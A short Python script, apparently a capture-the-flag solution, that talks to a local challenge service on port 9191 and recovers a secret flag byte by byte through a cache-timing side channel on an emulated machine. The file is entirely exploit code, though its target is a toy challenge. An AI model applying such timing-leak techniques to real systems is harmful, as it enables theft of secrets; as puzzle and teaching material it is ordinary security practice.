import socket

MEM_SIZE = 256
CACHE_SIZE = 32


def issue_cmd(sock, cmd):
    sock.sendall('{}\n'.format(cmd))
    return float(sock.recv(4096).strip())


def get_flag(sock):
    flag = []
    for addr in range(256):
        curr_base = 0
        issue_cmd(sock, 'mvl a {}'.format(addr))
        issue_cmd(sock, 'ldi b a')
        issue_cmd(sock, 'clear')
        while (curr_base + CACHE_SIZE) < MEM_SIZE:
            for index in range(CACHE_SIZE):
                guess = curr_base + index
                issue_cmd(sock, 'ld d {}'.format(guess))
            x = issue_cmd(sock, 'ldi c b')
            if x < .05:
                for index in range(CACHE_SIZE):
                    guess = index + curr_base
                    issue_cmd(sock, 'mvl a {}'.format(addr))
                    issue_cmd(sock, 'ldi b a')
                    issue_cmd(sock, 'clear')
                    issue_cmd(sock, 'ldi c b')
                    x = issue_cmd(sock, 'ld d {}'.format(guess))
                    if x < .05:
                        if guess == 0:
                            return ''.join(flag)
                        print(chr(guess))
                        flag.append(chr(guess))
                        break
                break
            curr_base += CACHE_SIZE


def main():
    sock = socket.socket()
    sock.connect(('localhost', 9191))
    flag = get_flag(sock)

if __name__ == '__main__':
    main()
